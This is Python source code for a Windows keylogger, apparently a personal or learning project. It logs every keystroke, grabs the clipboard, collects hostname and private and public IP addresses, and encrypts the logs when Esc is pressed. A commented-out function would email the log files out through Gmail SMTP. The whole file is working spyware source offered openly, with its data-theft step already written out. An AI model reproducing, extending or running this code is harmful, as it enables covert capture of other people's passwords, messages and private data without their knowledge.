#Libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

import socket
import platform

import win32clipboard

from pynput.keyboard import Key, Listener

import time
import os

from scipy.io.wavfile import write

from cryptography.fernet import Fernet

from Cryptography.generateKey import get_or_create_key

import getpass
from requests import get

from multiprocessing import Process, freeze_support

#base directory

base_dir = os.path.join(os.getcwd(), "Project", "Plain_Text")
os.makedirs(base_dir, exist_ok=True)

#Encrypted files directory

enc_dir = os.path.join(os.getcwd(), "Project", "Encrypted")
os.makedirs(enc_dir, exist_ok=True)

#Plain textfiles

key_information = "key_log.txt"
system_information = "system_info.txt"
clipboard_information = "clipboard.txt"

#Encrypted Textfiles

key_information_e = "e_key_information.txt"
system_information_e = "e_system_info.txt"
clipboard_information_e = "e_clipboard.txt"

#Plain textfiles Path

key_path = os.path.join(base_dir, key_information)
system_info_path = os.path.join(base_dir, system_information)
clipboard_path = os.path.join(base_dir, clipboard_information)

#Encrypted textfiles path (e stands for encrypted)

key_e_path = os.path.join(enc_dir, key_information_e) 
system_info_e_path = os.path.join(enc_dir, system_information_e)
clipboard_e_path = os.path.join(enc_dir, clipboard_information_e)

#Encryption Key

key = get_or_create_key()
fernet = Fernet(key)

count = 0
keys = []

#Email   (It was not working on my pc but maybe it will run you yours)

'''email_address = input("Enter senders Email Address: ")
password = input("Enter App specific Password")
toaddr = input("Enter the reciver's Address: ")

def send_email(filename, attachment, toaddr):

    fromaddr = email_address

    msg = MIMEMultipart()

    msg['From'] = fromaddr

    msg['To'] = toaddr

    msg['Subject'] = "Log File"

    body = "Body_of_the_mail"

    msg.attach(MIMEText(body, 'plain'))

    filename = filename
    attachment = open(attachment, 'rb')

    p = MIMEBase('application', 'octet-stream')

    p.set_payload((attachment).read())

    encoders.encode_base64(p)

    p.add_header('Content-Disposition', "attachment; filename = %s" % filename)

    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)

    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()'''



#PC Information

def pc_information():
    with open(system_info_path, "a") as f:
        hostname = socket.gethostname()
        ipaddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (Most Likely max query)")

        f.write("Processor: " + platform.processor() + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + ipaddr + '\n')



pc_information()



#Clipboard 

def copy_clipboard():
    with open(clipboard_path, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could not be copied")



copy_clipboard()

# Key Logger logic

def on_press(key):
    global keys, count 

    print(key)
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open(key_path, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write(" ")
            elif k.find("enter") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
               f.write(k)

#Esc key stops the key logger and starts the encryption of collected data

def on_release(released_key):
    if released_key == Key.esc:
        #Encryption

        files_to_encrypt = [(key_path,key_e_path), (system_info_path, system_info_e_path), (clipboard_path, clipboard_e_path)]

        for src, dst in files_to_encrypt:
            if not os.path.exists(src):
                continue

            with open(src, "rb") as f:
                data = f.read()

            encrypted = fernet.encrypt(data)

            with open(dst, "wb") as f:
                f.write(encrypted)

            '''try:
                send_email(key_information, attachment, toaddr)
            except Exception as e:
                print("Email failed:", e)'''

        listener.stop()
        os._exit(0)
        
#listener   

with Listener(on_press=on_press, on_release=on_release) as listener: 
    listener.join()